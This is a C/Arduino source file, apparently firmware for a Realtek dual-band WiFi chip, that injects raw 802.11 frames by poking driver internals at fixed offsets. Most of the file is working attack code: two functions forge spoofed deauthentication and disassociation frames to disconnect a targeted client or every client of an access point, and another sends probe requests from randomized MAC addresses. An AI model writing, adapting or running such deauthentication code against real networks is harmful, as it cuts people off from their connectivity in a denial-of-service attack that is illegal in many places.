#include "wifi_frame_tx.h"

int packet_sent = 0;

void rtl_tx_raw_frame(void* frame, size_t length) {
    void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
    void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);
  
    if (frame_control != 0) {
      update_mgntframe_attrib(ptr, frame_control + 8);
      memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
      uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
      memcpy(frame_data, frame, length);
      *(uint32_t *)(frame_control + 0x14) = length;
      *(uint32_t *)(frame_control + 0x18) = length;
      dump_mgntframe(ptr, frame_control);
    }
  }
  
  
void sendDualBandDeauthFrame(uint8_t bssid[6], uint8_t channel, uint8_t sta_mac[6]) {
    wext_set_channel(WLAN0_NAME, channel);

    memcpy(&deauth_frame_packet[4], sta_mac, 6);
    memcpy(&deauth_frame_packet[10], bssid, 6);
    memcpy(&deauth_frame_packet[16], bssid, 6);

    memcpy(&disassoc_frame_packet[4], sta_mac, 6);
    memcpy(&disassoc_frame_packet[10], bssid, 6);
    memcpy(&disassoc_frame_packet[16], bssid, 6);

    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));
    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));
    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));

    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));
    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));
    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));

    memcpy(&deauth_frame_packet[4], bssid, 6);
    memcpy(&deauth_frame_packet[10], sta_mac, 6);
    memcpy(&deauth_frame_packet[16], sta_mac, 6);

    memcpy(&disassoc_frame_packet[4], bssid, 6);
    memcpy(&disassoc_frame_packet[10], sta_mac, 6);
    memcpy(&disassoc_frame_packet[16], sta_mac, 6);

    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));
    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));
    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));

    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));
    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));
    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));
}

void sendDualBandDeauthFrame(uint8_t bssid[6], uint8_t channel) {
    wext_set_channel(WLAN0_NAME, channel);

    memcpy(&deauth_frame_packet[10], bssid, 6);
    memcpy(&deauth_frame_packet[16], bssid, 6);

    memcpy(&disassoc_frame_packet[10], bssid, 6);
    memcpy(&disassoc_frame_packet[16], bssid, 6);

    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));
    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));
    rtl_tx_raw_frame(deauth_frame_packet, sizeof(deauth_frame_packet));

    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));
    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));
    rtl_tx_raw_frame(disassoc_frame_packet, sizeof(disassoc_frame_packet));
}
  
void sendDualBandProbeReqFrame(String ssid, uint8_t channel) {
  wext_set_channel(WLAN0_NAME, channel);

	int ssid_len = ssid.length();

	probe_frame_packet[10] = random(256);
	probe_frame_packet[11] = random(256);
	probe_frame_packet[12] = random(256);
	probe_frame_packet[13] = random(256);
	probe_frame_packet[14] = random(256);
	probe_frame_packet[15] = random(256);

	probe_frame_packet[25] = ssid_len;

	char ssid_array[ssid_len + 1] = {};
	ssid.toCharArray(ssid_array, ssid_len + 1);

	for (int i = 0; i < ssid_len; i++)
		probe_frame_packet[26 + i] = ssid_array[i];

	uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
			0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
			0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
			0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
			0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
			0x00, 0x00, 0x00, 0x00};

	uint8_t good_probe_req_packet[26 + ssid_len + 40] = {};

	for (int i = 0; i < 26 + ssid_len; i++)
		good_probe_req_packet[i] = probe_frame_packet[i];

	for(int i = 0; i < 40; i++) 
		good_probe_req_packet[26 + ssid_len + i] = postSSID[i];

	rtl_tx_raw_frame(good_probe_req_packet, sizeof(good_probe_req_packet));
	rtl_tx_raw_frame(good_probe_req_packet, sizeof(good_probe_req_packet));
	rtl_tx_raw_frame(good_probe_req_packet, sizeof(good_probe_req_packet));
}